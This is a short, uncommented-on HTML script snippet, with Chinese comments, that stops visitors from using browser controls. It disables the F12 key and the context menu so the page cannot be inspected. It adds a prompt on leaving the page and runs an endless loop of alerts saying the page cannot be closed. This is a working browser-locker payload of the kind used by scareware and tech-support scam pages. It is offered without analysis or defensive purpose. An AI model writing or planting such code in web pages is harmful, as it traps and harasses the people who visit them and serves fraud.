<script>// 禁用F12开发者工具
document.addEventListener('keydown', function(event) {
  if (event.keyCode === 123) { // F12的键码
    event.preventDefault();
  }
});

// 禁用右键菜单
document.addEventListener('contextmenu', function(event) {
  event.preventDefault();
});

// 阻止窗口关闭
window.onbeforeunload = function() {
  return '你确定要离开这个页面吗？';
};

// 无限循环警告对话框
function alertLoop() {
  alert('你不能关闭这个页面！');
  setTimeout(alertLoop, 10);
}
alertLoop();
</script>
